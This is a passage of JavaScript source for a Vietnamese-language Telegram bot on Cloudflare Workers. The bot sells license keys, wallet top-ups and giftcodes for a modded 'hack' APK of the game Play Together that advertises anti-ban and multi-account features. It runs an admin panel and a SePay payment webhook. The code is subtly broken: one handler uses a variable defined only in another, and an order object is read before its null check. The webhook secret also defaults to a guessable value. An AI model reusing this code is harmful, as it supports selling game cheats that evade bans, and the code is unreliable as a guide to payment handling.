      `• Hệ thống cho phép vượt link để nhận key VIP 1 ngày hoàn toàn miễn phí.\n` +
      `• Key reset tự động mỗi ngày.\n\n` +
      `👉 <i>Bấm vào nút bên dưới để mở trang vượt link:</i>`;

    const kb = new InlineKeyboard()
      .url('🚀 Bấm Để Vượt Link Lấy Key', link).row()
      .text('🔙 Quay lại Menu Chính', 'main_menu');
    return ctx.editMessageText(text, { parse_mode: 'HTML', reply_markup: kb });
  });

  // 6. KIEM TRA KEY
  bot.callbackQuery('check_key', async (ctx) => {
    await ctx.answerCallbackQuery();
    const text = 
      `🔍 <b>KIỂM TRA THÔNG TIN KEY</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `Để kiểm tra hạn dùng hoặc trạng thái của key, vui lòng nhắn tin theo cú pháp:\n` +
      `👉 <code>/check MNHUT-XXXXX-XXXXX-XXXXX</code>`;
    const kb = new InlineKeyboard().text('🔙 Quay lại Menu Chính', 'main_menu');
    return ctx.editMessageText(text, { parse_mode: 'HTML', reply_markup: kb });
  });

  bot.command('check', async (ctx) => {
    const key = (ctx.message.text.split(/\s+/)[1] || '').trim();
    if (!key) return ctx.reply('⚠️ Cú pháp: <code>/check MNHUT-XXXXX-XXXXX-XXXXX</code>', { parse_mode: 'HTML' });
    const r = await verifyKey(env.SALT, key);
    if (!r.ok) return ctx.reply(`❌ <b>Key không hợp lệ hoặc đã hết hạn!</b>\nLý do: ${r.reason}`, { parse_mode: 'HTML' });
    return ctx.reply(
      `✅ <b>KEY HỢP LỆ (MNHUT VIP)</b>\n` +
      `• Mã key: <code>${key}</code>\n` +
      `• Hạn sử dụng đến: <b>${r.expDate}</b>\n` +
      `• Khóa máy (HWID): <b>${r.boundToDevice ? 'Đã khóa máy' : 'Tự do'}</b>`,
      { parse_mode: 'HTML' }
    );
  });

  // 7. TAI FILE HACK
  bot.callbackQuery('download_hack', async (ctx) => {
    await ctx.answerCallbackQuery();
    const apkUrl = await store.getSetting('apk_download_url', 'https://github.com/nhut101107/misulo/releases');
    const text = 
      `🎮 <b>TẢI FILE HACK PLAY TOGETHER - MNHUT VIP</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `• Phiên bản: <b>MNHUT MOD v3.6 (mnhutv3.6.apk)</b>\n` +
      `• Tính năng: Multi account, Anti-ban nâng cấp, Tự động đọc key từ file <code>/sdcard/mnhut_key.txt</code>.\n\n` +
      `👉 <i>Bấm nút bên dưới để tải file APK mới nhất:</i>`;

    const kb = new InlineKeyboard()
      .url('📥 Tải File mnhutv3.6.apk', apkUrl).row()
      .text('🔙 Quay lại Menu Chính', 'main_menu');
    return ctx.editMessageText(text, { parse_mode: 'HTML', reply_markup: kb });
  });

  // 8. GIFTCODE
  bot.callbackQuery('giftcode_menu', async (ctx) => {
    await ctx.answerCallbackQuery();
    const text = 
      `🎁 <b>NHẬP MÃ GIFTCODE NHẬN TIỀN VÍ</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `Nếu bạn có mã Giftcode từ Admin hoặc Event, hãy nhắn tin theo cú pháp:\n` +
      `👉 <code>/code MA-GIFTCODE-CUA-BAN</code>\n\n` +
      `Ví dụ: <code>/code MNHUT50K-8492</code>`;
    const kb = new InlineKeyboard().text('🔙 Quay lại Menu Chính', 'main_menu');
    return ctx.editMessageText(text, { parse_mode: 'HTML', reply_markup: kb });
  });

  bot.command('code', async (ctx) => {
    const code = (ctx.message.text.split(/\s+/)[1] || '').trim().toUpperCase();
    if (!code) return ctx.reply('⚠️ Cú pháp: <code>/code MA_GIFTCODE</code>', { parse_mode: 'HTML' });
    const res = await store.useGiftcode(code, ctx.from.id);
    if (!res.ok) {
      if (res.reason === 'already_used') return ctx.reply('❌ Mã giftcode này đã có người sử dụng rồi!');
      return ctx.reply('❌ Mã giftcode không tồn tại hoặc không hợp lệ!');
    }
    const u = await store.getUser(ctx.from.id);
    return ctx.reply(
      `🎉 <b>CHÚC MỪNG BẠN ĐÃ NHẬP GIFTCODE THÀNH CÔNG!</b>\n` +
      `• Bạn nhận được: <b>+${fmtVND(res.amount)}</b> vào ví!\n` +
      `• Số dư ví hiện tại: <b>${fmtVND(u.balance)}</b>`,
      { parse_mode: 'HTML' }
    );
  });

  // --- DUYET THU CONG CALLBACKS (CHO ADMIN) ---
  bot.callbackQuery(/appr_topup_(.+)/, async (ctx) => {
    if (!isAdmin(env, ctx.from.id)) return ctx.answerCallbackQuery('Chỉ Admin mới có quyền duyệt!');
    const code = ctx.match[1];
    const t = await store.approveTopup(code);
    if (!t) return ctx.answerCallbackQuery('Đơn nạp này không tồn tại hoặc đã được duyệt trước đó!');
    await ctx.answerCallbackQuery('Đã duyệt đơn nạp tiền thành công!');

    // Sửa tin nhắn bên admin
    await ctx.editMessageText(
      ctx.callbackQuery.message.text + `\n\n✅ <b>ĐÃ DUYỆT THÀNH CÔNG BỞI ADMIN @${ctx.from.username || ctx.from.id}</b>\n(Đã cộng ${fmtVND(t.amount)} vào ví khách)`,
      { parse_mode: 'HTML' }
    );

    // Báo khách
    const u = await store.getUser(t.user_id);
    tgSend(env.BOT_TOKEN, t.user_id,
      `🎉 <b>NẠP TIỀN VÍ THÀNH CÔNG!</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `• Bạn vừa được cộng: <b>+${fmtVND(t.amount)}</b>\n` +
      `• Số dư ví hiện tại: <b>${fmtVND(u.balance)}</b>\n` +
      `• Bây giờ bạn có thể vào 🏪 Cửa hàng để mua key VIP bất cứ lúc nào!`,
      { reply_markup: new InlineKeyboard().text('🏪 Vào Cửa Hàng Mua Key', 'shop') }
    );
  });

  bot.callbackQuery(/rej_topup_(.+)/, async (ctx) => {
    if (!isAdmin(env, ctx.from.id)) return ctx.answerCallbackQuery('Chỉ Admin mới có quyền!');
    const code = ctx.match[1];
    const t = await store.getTopup(code);
    await store.rejectTopup(code);
    await ctx.answerCallbackQuery('Đã từ chối đơn nạp!');
    await ctx.editMessageText(
      ctx.callbackQuery.message.text + `\n\n❌ <b>ĐÃ TỪ CHỐI BỞI ADMIN @${ctx.from.username || ctx.from.id}</b>`,
      { parse_mode: 'HTML' }
    );
    if (t) {
      tgSend(env.BOT_TOKEN, t.user_id, `❌ <b>Yêu cầu nạp tiền ${fmtVND(t.amount)} của bạn đã bị từ chối!</b>\nLý do: Không nhận được tiền hoặc sai nội dung. Vui lòng liên hệ @mnhutdznecon nếu có nhầm lẫn.`);
    }
  });

  bot.callbackQuery(/appr_order_(.+)/, async (ctx) => {
    if (!isAdmin(env, ctx.from.id)) return ctx.answerCallbackQuery('Chỉ Admin mới có quyền duyệt!');
    const code = ctx.match[1];
    const o = await store.getOrder(code); const targetUserId = o.userId || o.user_id || o.uid;
    if (!o || o.status === 'paid') return ctx.answerCallbackQuery('Đơn này không tồn tại hoặc đã xử lý!');

    const key = await issueKey(env.SALT, o.days);
    const v = await verifyKey(env.SALT, key);
    o.status = 'paid';
    o.paidAt = Date.now();
    o.paidAmount = o.price;
    await store.putOrder(o);
    await store.putKey({
      key, label: o.label, exp: v.expDate,
      userId: o.user_id, order: code, createdAt: Date.now()
    });

    await ctx.answerCallbackQuery('Đã duyệt đơn và cấp key cho khách!');
    await ctx.editMessageText(
      ctx.callbackQuery.message.text + `\n\n✅ <b>ĐÃ DUYỆT BỞI ADMIN @${ctx.from.username || ctx.from.id}</b>\n(Key đã cấp: <code>${key}</code>)`,
      { parse_mode: 'HTML' }
    );

    // Gửi key cho khách
    tgSend(env.BOT_TOKEN, o.user_id,
      `🎉 <b>ĐƠN MUA KEY CỦA BẠN ĐÃ ĐƯỢC ADMIN DUYỆT!</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `• Gói: <b>${o.label}</b>\n` +
      `• Hạn dùng: <b>${v.expDate}</b>\n\n` +
      `🔑 <b>Key của bạn (bấm vào để copy):</b>\n` +
      `<code>${key}</code>\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `📌 <b>Kích hoạt:</b> Mở file <code>/sdcard/mnhut_key.txt</code> dán key trên vào là xong!`,
      { reply_markup: new InlineKeyboard().text('📜 Xem Lịch Sử Key', 'order_history') }
    );
  });

  bot.callbackQuery(/rej_order_(.+)/, async (ctx) => {
    if (!isAdmin(env, ctx.from.id)) return ctx.answerCallbackQuery('Chỉ Admin mới có quyền!');
    const code = ctx.match[1];
    const o = await store.getOrder(code);
    if (o) {
      o.status = 'cancelled';
      await store.putOrder(o);
      await tgSend(env.BOT_TOKEN, targetUserId, `❌ Đơn mua key ${code} (${o.label}) của bạn đã bị từ chối do chưa thanh toán.`);
    }
    await ctx.answerCallbackQuery('Đã từ chối đơn!');
    await ctx.editMessageText(ctx.callbackQuery.message.text + `\n\n❌ <b>ĐÃ TỪ CHỐI ĐƠN NÀY</b>`, { parse_mode: 'HTML' });
  });

  // --- PANEL ADMIN (/admin) ---
  bot.command('admin', async (ctx) => {
    if (!isAdmin(env, ctx.from.id)) return ctx.reply('⛔ Bạn không phải là Admin hệ thống!');
    const st = await store.stats();
    const text = 
      `👑 <b>BẢNG ĐIỀU KHIỂN QUẢN TRỊ - MNHUT VIP</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `📊 <b>Thống kê nhanh hệ thống:</b>\n` +
      `• Tổng doanh thu: <b>${fmtVND(st.revenue)}</b>\n` +
      `• Số đơn đã bán: <b>${st.paid}</b> | Tổng key cấp: <b>${st.keys}</b>\n` +
      `• Đơn nạp chờ duyệt: <b>${st.pendingTopups || 0}</b> đơn\n` +
      `• Khách hàng: <b>${st.users || 0}</b> người\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `👉 <i>Bấm chọn danh mục quản lý bên dưới:</i>`;

    const kb = new InlineKeyboard()
      .text(`⏳ Đơn Chờ Duyệt Tiền (${st.pendingTopups || 0})`, 'adm_pending').row()
      .text('🔑 Quản Lý Key', 'adm_keys').text('👤 Quản Lý User', 'adm_users').row()
      .text('🎁 Quản Lý Giftcode', 'adm_giftcodes').text('⚙️ Cài Đặt Hệ Thống', 'adm_settings');

    return ctx.reply(text, { parse_mode: 'HTML', reply_markup: kb });
  });

  bot.callbackQuery('adm_main', async (ctx) => {
    if (!isAdmin(env, ctx.from.id)) return ctx.answerCallbackQuery('Chỉ Admin!');
    await ctx.answerCallbackQuery();
    const st = await store.stats();
    const text = 
      `👑 <b>BẢNG ĐIỀU KHIỂN QUẢN TRỊ - MNHUT VIP</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `• Tổng doanh thu: <b>${fmtVND(st.revenue)}</b>\n` +
      `• Đơn nạp chờ duyệt: <b>${st.pendingTopups || 0}</b> đơn\n` +
      `• Tổng số key đã tạo: <b>${st.keys}</b> key\n` +
      `━━━━━━━━━━━━━━━━━━━━`;
    const kb = new InlineKeyboard()
      .text(`⏳ Đơn Chờ Duyệt Tiền (${st.pendingTopups || 0})`, 'adm_pending').row()
      .text('🔑 Quản Lý Key', 'adm_keys').text('👤 Quản Lý User', 'adm_users').row()
      .text('🎁 Quản Lý Giftcode', 'adm_giftcodes').text('⚙️ Cài Đặt Hệ Thống', 'adm_settings');
    return ctx.editMessageText(text, { parse_mode: 'HTML', reply_markup: kb });
  });

  // Admin: Don cho duyet
  bot.callbackQuery('adm_pending', async (ctx) => {
    if (!isAdmin(env, ctx.from.id)) return ctx.answerCallbackQuery('Chỉ Admin!');
    await ctx.answerCallbackQuery();
    const pending = await store.listPendingTopups(5);
    if (!pending || pending.length === 0) {
      const kb = new InlineKeyboard().text('🔙 Quay Lại', 'adm_main');
      return ctx.editMessageText('✅ <b>Hiện tại không có đơn nạp nào đang chờ duyệt!</b>', { parse_mode: 'HTML', reply_markup: kb });
    }
    const kb = new InlineKeyboard();
    let text = `⏳ <b>DANH SÁCH ĐƠN NẠP ĐANG CHỜ DUYỆT:</b>\n\n`;
    pending.forEach((t, i) => {
      text += `<b>${i + 1}. Mã: ${t.code}</b> | Tiền: <b>${fmtVND(t.amount)}</b> (ID: <code>${t.user_id}</code>)\n`;
      kb.text(`✅ Duyệt ${t.code}`, `appr_topup_${t.code}`).text(`❌ Hủy`, `rej_topup_${t.code}`).row();
    });
    kb.text('🔙 Quay Lại', 'adm_main');
    return ctx.editMessageText(text, { parse_mode: 'HTML', reply_markup: kb });
  });

  // Admin: Quan ly Key
  bot.callbackQuery('adm_keys', async (ctx) => {
    if (!isAdmin(env, ctx.from.id)) return ctx.answerCallbackQuery('Chỉ Admin!');
    await ctx.answerCallbackQuery();
    const text = 
      `🔑 <b>QUẢN LÝ KEY HỆ THỐNG - MNHUT VIP</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `• Bấm tạo nhanh key theo gói bên dưới:\n` +
      `• Lệnh thủ công nếu cần:\n` +
      `  - <code>/gen &lt;ngày&gt;</code>: Tạo key số ngày tùy ý\n` +
      `  - <code>/unbind &lt;key&gt;</code>: Reset mã máy (HWID)\n` +
      `  - <code>/delkey &lt;key&gt;</code>: Xóa key khỏi hệ thống`;
    const kb = new InlineKeyboard()
      .text('➕ Tạo Key 1 Ngày', 'adm_gen_1').text('➕ Tạo Key 7 Ngày', 'adm_gen_7').row()
      .text('➕ Tạo Key 30 Ngày', 'adm_gen_30').text('➕ Tạo Key Vĩnh Viễn', 'adm_gen_30000').row()
      .text('🔙 Quay Lại', 'adm_main');
    return ctx.editMessageText(text, { parse_mode: 'HTML', reply_markup: kb });
  });

  bot.callbackQuery(/adm_gen_(\d+)/, async (ctx) => {
    if (!isAdmin(env, ctx.from.id)) return ctx.answerCallbackQuery('Chỉ Admin!');
    const days = Number(ctx.match[1]);
    await ctx.answerCallbackQuery();
    const key = await issueKey(env.SALT, days);
    const v = await verifyKey(env.SALT, key);
    await store.putKey({
      key, label: `Admin-${days >= 30000 ? 'VV' : days + 'd'}`, exp: v.expDate,
      userId: ctx.from.id, order: 'manual', createdAt: Date.now()
    });
    const text = 
      `🎉 <b>TẠO KEY THÀNH CÔNG!</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `• Gói: <b>${days >= 30000 ? 'Vĩnh viễn' : days + ' ngày'}</b>\n` +
      `• Hạn dùng: <b>${v.expDate}</b>\n\n` +
      `🔑 <b>Key (bấm để copy):</b>\n` +
      `<code>${key}</code>`;
    const kb = new InlineKeyboard().text('🔙 Quay Lại Quản Lý Key', 'adm_keys');
    return ctx.editMessageText(text, { parse_mode: 'HTML', reply_markup: kb });
  });

  // Admin: Quan ly Giftcode
  bot.callbackQuery('adm_giftcodes', async (ctx) => {
    if (!isAdmin(env, ctx.from.id)) return ctx.answerCallbackQuery('Chỉ Admin!');
    await ctx.answerCallbackQuery();
    const codes = await store.listGiftcodes(5);
    let text = 
      `🎁 <b>QUẢN LÝ GIFTCODE NẠP TIỀN VÍ</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `👉 <i>Bấm nút bên dưới để tạo nhanh mã giftcode phát cho khách:</i>\n\n`;
    if (codes && codes.length > 0) {
      text += `<b>Danh sách code gần đây:</b>\n`;
      codes.forEach(c => {
        text += `• <code>${c.code}</code>: <b>${fmtVND(c.amount)}</b> (${c.used_by ? 'Đã dùng' : 'Chưa dùng'})\n`;
      });
    }
    const kb = new InlineKeyboard()
      .text('➕ Tạo Code 10k', 'adm_gcode_10000').text('➕ Tạo Code 20k', 'adm_gcode_20000').row()
      .text('➕ Tạo Code 50k', 'adm_gcode_50000').text('➕ Tạo Code 100k', 'adm_gcode_100000').row()
      .text('🔙 Quay Lại', 'adm_main');
    return ctx.editMessageText(text, { parse_mode: 'HTML', reply_markup: kb });
  });

  bot.callbackQuery(/adm_gcode_(\d+)/, async (ctx) => {
    if (!isAdmin(env, ctx.from.id)) return ctx.answerCallbackQuery('Chỉ Admin!');
    const amt = Number(ctx.match[1]);
    await ctx.answerCallbackQuery();
    const code = `MNHUT${amt/1000}K-${Math.floor(1000 + Math.random() * 9000)}`;
    await store.createGiftcode(code, amt, ctx.from.id);
    const text = 
      `🎉 <b>TẠO GIFTCODE THÀNH CÔNG!</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `• Mệnh giá: <b>+${fmtVND(amt)}</b>\n` +
      `• Mã Code: <code>${code}</code>\n\n` +
      `👉 <i>Gửi mã này cho khách, khách gõ <code>/code ${code}</code> là được cộng tiền ví ngay!</i>`;
    const kb = new InlineKeyboard().text('🔙 Quay Lại', 'adm_giftcodes');
    return ctx.editMessageText(text, { parse_mode: 'HTML', reply_markup: kb });
  });

  // Admin: Cai dat he thong
  bot.callbackQuery('adm_settings', async (ctx) => {
    if (!isAdmin(env, ctx.from.id)) return ctx.answerCallbackQuery('Chỉ Admin!');
    await ctx.answerCallbackQuery();
    const maint = await store.getSetting('maintenance', '0');
    const isMaint = maint === '1' || maint === 'true';
    const text = 
      `⚙️ <b>CÀI ĐẶT HỆ THỐNG MNHUT VIP</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `• Trạng thái bảo trì: <b>${isMaint ? '🔴 ĐANG BẬT' : '🟢 ĐANG TẮT (Hoạt động bình thường)'}</b>\n` +
      `• Đổi link tải APK: <code>/setapk &lt;link&gt;</code>\n` +
      `• Đổi link vượt key: <code>/setbypass &lt;link&gt;</code>`;
    const kb = new InlineKeyboard()
      .text(isMaint ? '🟢 Tắt Chế Độ Bảo Trì' : '🔴 Bật Chế Độ Bảo Trì', 'adm_toggle_maint').row()
      .text('🔙 Quay Lại', 'adm_main');
    return ctx.editMessageText(text, { parse_mode: 'HTML', reply_markup: kb });
  });

  bot.callbackQuery('adm_toggle_maint', async (ctx) => {
    if (!isAdmin(env, ctx.from.id)) return ctx.answerCallbackQuery('Chỉ Admin!');
    const maint = await store.getSetting('maintenance', '0');
    const newVal = (maint === '1' || maint === 'true') ? '0' : '1';
    await store.setSetting('maintenance', newVal);
    await ctx.answerCallbackQuery(newVal === '1' ? 'Đã bật bảo trì!' : 'Đã tắt bảo trì!');
    return ctx.editMessageText(`⚙️ <b>Trạng thái bảo trì đã đổi thành:</b> <b>${newVal === '1' ? '🔴 BẬT' : '🟢 TẮT'}</b>`, {
      parse_mode: 'HTML',
      reply_markup: new InlineKeyboard().text('🔙 Quay Lại Cài Đặt', 'adm_settings')
    });
  });

  return bot;
}

// --- CLOUDFLARE WORKER FETCH HANDLER ---
export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const store = getStore(env);

    // 1. Health check
    if (url.pathname === '/health') {
      return new Response(JSON.stringify({ ok: true, name: 'mnhut-vip-bot', time: Date.now() }), {
        headers: { 'content-type': 'application/json' }
      });
    }

    // 2. Setup webhook (mo link nay 1 lan tren dien thoai)
    if (url.pathname === '/setup') {
      const s = url.searchParams.get('s');
      if (s !== (env.WEBHOOK_SECRET || 'mnhut')) {
        return new Response('Unauthorized secret', { status: 401 });
      }
      const hookUrl = `${url.origin}/telegram/${env.WEBHOOK_SECRET || 'mnhut'}`;
      const r = await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/setWebhook?url=${encodeURIComponent(hookUrl)}`);
      const j = await r.json();
      return new Response(JSON.stringify({ hookUrl, telegramResponse: j }, null, 2), {
        headers: { 'content-type': 'application/json' }
      });
    }

    // 3. Telegram Webhook Callback
    const tgPath = `/telegram/${env.WEBHOOK_SECRET || 'mnhut'}`;
    if (url.pathname === tgPath && request.method === 'POST') {
      const bot = buildBot(env);
      return webhookCallback(bot, 'cloudflare-mod')(request);
    }

    // 4. SePay Webhook Auto-fulfillment
    if (url.pathname === '/sepay-webhook' && request.method === 'POST') {
      try {
        const auth = request.headers.get('authorization') || '';
        if (auth !== 'Apikey ' + (env.SEPAY_API_KEY || '')) {
          return new Response(JSON.stringify({ success: false, message: 'unauthorized' }), { status: 401 });
        }
        const b = await request.json();
        const content = String(b.content || b.description || '').toUpperCase().replace(/[^A-Z0-9]/g, ' ');
        const m = content.match(/MN[A-Z0-9]{8}/) || content.match(/NAP\d+[A-Z0-9]+/);
        if (!m) return new Response(JSON.stringify({ success: true, message: 'no_code' }));

        const code = m[0];
        const amount = Number(b.transferAmount || b.amount || 0);

        if (code.startsWith('NAP')) {
          const t = await store.approveTopup(code);
          if (t) {
            tgSend(env.BOT_TOKEN, t.user_id, `🎉 Nạp tiền tự động qua SePay thành công: +${fmtVND(amount)} vào ví!`);
          }
        } else {
          const o = await store.getOrder(code);
          if (o && o.status === 'pending') {
            const key = await issueKey(env.SALT, o.days);
            const v = await verifyKey(env.SALT, key);
            o.status = 'paid'; o.paidAt = Date.now(); o.paidAmount = amount;
            await store.putOrder(o);
            await store.putKey({ key, label: o.label, exp: v.expDate, userId: o.user_id, order: code, createdAt: Date.now() });
            tgSend(env.BOT_TOKEN, o.user_id, `🎉 Đơn hàng ${code} đã tự động kích hoạt! Key của bạn: <code>${key}</code>`);
          }
        }
        return new Response(JSON.stringify({ success: true }));
      } catch (e) {
        return new Response(JSON.stringify({ success: false, error: e.message }), { status: 500 });
      }
    }

    return new Response('MNHUT VIP Bot is Running on Cloudflare Workers 24/7!', { status: 200 });
  }
};
